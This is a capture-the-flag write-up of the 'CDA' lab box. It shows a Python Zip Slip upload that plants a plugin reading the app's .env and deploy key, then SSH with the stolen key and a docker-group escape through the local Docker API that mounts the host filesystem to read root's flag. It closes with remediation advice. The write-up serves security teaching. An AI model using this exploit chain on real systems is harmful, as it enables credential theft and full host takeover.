# CDA — same plugin Zip Slip, a second docker-group escape

> 📖 **Public write-up by [alwil17](https://github.com/Alwil17)** — originally published at <https://alwil17.github.io/ctf-writeups/posts/cda/>  
> Source: <https://github.com/Alwil17/ctf-writeups> · MIT License, © 2026 alwil17 (see `THIRD_PARTY_LICENSES/alwil17-ctf-writeups.LICENSE`). Front matter removed, article body unmodified.

> **TL;DR** — CDA is the twin of the ANcy box: a plugin uploader that extracts a
> ZIP without checking paths. I drop `../../app/plugins/pwn.py`, the worker runs
> it as `www-data`, I read the `.env` and the deploy key, SSH in as `deploy`, and
> `deploy` is in the `docker` group — so the local Docker API mounts the host and
> hands me root. **Flag:** `/root/root.txt` → `NCTF{…}`.

## 1. Briefing

Another finale boot2root, same shape as ANcy but a separate instance and flag. I
keep the writeup short because the vulnerability class is identical; if you want
the long version with every payload explained, read the
[ANcy writeup](/ctf-writeups/posts/ancy/) first.

| Field | Value |
|-------|-------|
| Target | ephemeral lab — web, SSH, Docker API |
| Chain | plugin ZIP upload (Zip Slip) |
| Flag | `NCTF{...}` |

## 2. Reconnaissance

```bash
curl -s http://<ip>/api/version
```

Same six decoy services on the high ports (`3000`, `4848`, `5601`, `8082`,
`9090`, `8888`) — they answer but go nowhere. The plugin uploader at `/upload`
is the real door.

## 3. Analysis

`/upload` extracts an archive into the plugins directory and a worker imports
every `.py` it finds, with no path normalisation. A ZIP entry that starts with
`../` escapes the extraction directory and writes an executable plugin wherever I
point it — Zip Slip straight into code execution.

## 4. Exploitation

### Step 1 — Zip Slip plugin

```python
import io, zipfile, requests

plugin = ("import os\n"
          "open('/opt/app/plugins/leak.txt','w').write(\n"
          "    os.popen('cat /opt/app/.env; cat /opt/app/deploy_key.b64').read())\n")
buf = io.BytesIO()
with zipfile.ZipFile(buf, "w") as z:
    z.writestr("../../app/plugins/pwn.py", plugin)

requests.post("http://<ip>/upload", data=buf.getvalue(),
              headers={"Content-Type": "application/json"})
requests.post("http://<ip>/api/worker/tick", data=b"{}")   # loads plugins → RCE as www-data
```

Reading the dropped `leak.txt` gives me the `.env` and the base64 deploy key.

### Step 2 — deploy → root via docker

```bash
base64 -d deploy_key.b64 > deploy_key && chmod 600 deploy_key
ssh -i deploy_key deploy@<ip>
id                     # groups=...,docker
# local Docker API on 127.0.0.1:2375 — mount the host root and read the flag
curl -s http://127.0.0.1:2375/containers/create -H 'Content-Type: application/json' \
  -d '{"Image":"alpine","Cmd":["cat","/host/root/root.txt"],"HostConfig":{"Binds":["/:/host"]}}'
curl -s -XPOST http://127.0.0.1:2375/containers/<id>/start
curl -s http://127.0.0.1:2375/containers/<id>/logs?stdout=1
```

## 5. Flag

```text
NCTF{…}
```

## 6. Lessons & remediation

The fixes are the same as ANcy's: normalise every archive entry and never run
freshly extracted files; keep deploy keys out of the web root; and treat the
`docker` group as root — don't hand it to a service account, and never expose the
Docker API without mutual TLS. Seeing the identical chain on two boxes is a good
reminder that a weak pattern in a shared platform repeats everywhere it's reused.
